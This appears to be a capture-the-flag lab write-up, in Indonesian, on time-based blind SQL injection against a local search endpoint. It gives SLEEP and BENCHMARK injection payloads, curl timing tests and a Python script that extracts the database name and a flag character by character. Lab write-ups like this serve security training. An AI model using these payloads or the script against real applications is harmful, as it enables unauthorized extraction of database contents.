# Lab M3 - Time Based Blind SQL Injection (Medium)

## Informasi Lab
- **Endpoint**: `/search.php` (POST)
- **Tipe**: Time Based Blind Injection
- **Hint**: Delay behavior - sleep()

## Analisis

### 1. Karakteristik Time Based Blind
- Tidak ada perbedaan output visible
- Tidak ada error yang ditampilkan
- Hanya bisa mendeteksi dari waktu response

### 2. Test dengan SLEEP
```
POST /m3/search.php
q=test' AND SLEEP(5)-- -
```
Jika response membutuhkan waktu > 5 detik, maka vulnerable.

## Solusi

### Script Python untuk Automasi

```python
import requests
import time

url = "http://localhost/m3/search.php"

def check(condition):
    payload = f"test' AND IF(({condition}),SLEEP(2),0)-- -"
    start = time.time()
    r = requests.post(url, data={"q": payload})
    return time.time() - start > 2

# Get database length
print("Getting database length...")
db_len = 0
for i in range(1, 30):
    if check(f"LENGTH(database())={i}"):
        db_len = i
        print(f"Database length: {db_len}")
        break

# Get database name
print("Getting database name...")
db_name = ""
for i in range(1, db_len + 1):
    for c in "abcdefghijklmnopqrstuvwxyz_":
        if check(f"ASCII(SUBSTRING(database(),{i},1))={ord(c)}"):
            db_name += c
            print(f"Database: {db_name}")
            break

# Get flag length
print("Getting flag length...")
flag_len = 0
for i in range(1, 50):
    if check(f"(SELECT LENGTH(flag) FROM flags LIMIT 1)={i}"):
        flag_len = i
        print(f"Flag length: {flag_len}")
        break

# Get flag
print("Getting flag...")
flag = ""
charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}IDS_"
for i in range(1, flag_len + 1):
    for c in charset:
        if check(f"ASCII(SUBSTRING((SELECT flag FROM flags LIMIT 1),{i},1))={ord(c)}"):
            flag += c
            print(f"Flag: {flag}")
            break

print(f"\nFinal Flag: {flag}")
```

### Manual Method

```bash
# Test kondisi true
curl -X POST "http://localhost/m3/search.php" -d "q=test' AND IF(1=1,SLEEP(3),0)-- -" -w "%{time_total}\n"
# Response time > 3 detik

# Test kondisi false
curl -X POST "http://localhost/m3/search.php" -d "q=test' AND IF(1=2,SLEEP(3),0)-- -" -w "%{time_total}\n"
# Response time < 1 detik
```

### Payload untuk Ekstraksi
```
q=test' AND IF(ASCII(SUBSTRING((SELECT flag FROM flags LIMIT 1),1,1))>64,SLEEP(2),0)-- -
```

### Alternatif: BENCHMARK
```
q=test' AND IF(condition,BENCHMARK(10000000,SHA1('test')),0)-- -
```

### Flag
```
IDS{XXXXXXXXXXXXXX}
```

## Tips
- Time based paling lambat, gunakan sleep minimal (1-2 detik)
- Binary search untuk efisiensi
- Gunakan script dengan threading untuk mempercepat
- Bisa kombinasikan dengan boolean blind jika ada indikasi
